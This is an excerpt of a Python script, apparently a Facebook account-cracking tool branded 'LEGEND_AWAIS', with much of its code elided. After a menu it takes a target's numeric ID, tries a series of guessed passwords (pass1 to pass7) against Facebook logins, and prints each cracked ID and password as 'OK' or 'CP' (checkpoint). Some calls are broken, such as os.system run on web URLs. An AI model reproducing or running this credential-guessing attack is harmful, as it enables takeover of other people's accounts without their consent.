...
logo = """                                
   _____  __      __  _____  .___  _________
  /  _  \/  \    /  \/  _  \ |   |/   _____/
 /  /_\  \   \/\/   /  /_\  \|   |\_____  \ 
/    |    \        /    |    \   |/        \
...
\033[1;93m OWNER: AWAIS_KHAN

\033[1;93m Facebook:AWAIS KHAN

\033[1;93m YOUTUBE: MOMAND TRICKS
...
def main():
    ...
    print("\033[1;95m[2]\033[1;97mFOLLOW Awais khan ")
    ...
    print("\033[1;91m[0]\033[1;97mEXIT AWAIS KHAN ")
...
def main_select():
    ...
    if Mz =="2":
        ...
        os.system("https://www.facebook.com/Mohmand.awais")
...
def login_select():
	...
	print("")
	    ...
	    os.system("https://youtu.be/Yg8r9bQg0kc")
...
def menu():
    ...
    print("\033[1;97m[0]\033[1;97mEXIT AWAIS")
...
def menu_select():
	...
	if select =="2":
		...
		idt = raw_input("\033[1;97m[#] PUT NUMBERIC ID :\033[1;96m ")
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[LEGEND_AWAIS OK] "+uid+" = "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[LEGEND_AWAIS OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[ LEGEND_AWAIS OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[LEGEND_AWAIS OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[LEGEND_AWAIS OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;97m[LEGEND_AWAIS OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;93m[LEGEND_AWAIS CP] "+uid+" = "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;97m[LEGEND_AWAIS OK] "+uid+" = "+pass7+"\x1b[1;0m")
	...
	print ("[!] ITZ AWAIS_MOMAND Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
